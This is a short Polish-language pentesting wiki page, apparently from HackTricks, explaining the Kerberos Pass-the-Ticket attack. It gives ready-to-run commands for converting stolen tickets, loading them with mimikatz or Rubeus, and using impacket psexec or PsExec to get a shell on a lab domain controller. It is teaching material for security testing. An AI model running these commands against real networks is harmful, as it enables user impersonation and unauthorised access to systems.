# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

W metodzie ataku **Pass The Ticket (PTT)**, atakujący **kradną bilet uwierzytelniający użytkownika** zamiast jego hasła lub wartości skrótu. Ten skradziony bilet jest następnie używany do **podszywania się pod użytkownika**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.

**Przeczytaj**:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Swapping Linux and Windows tickets between platforms**

Narzędzie [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konwertuje formaty biletów, używając tylko samego biletu i pliku wyjściowego.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
W systemie Windows [Kekeo](https://github.com/gentilkiwi/kekeo) może być używany.

### Atak Pass The Ticket
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Odniesienia

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
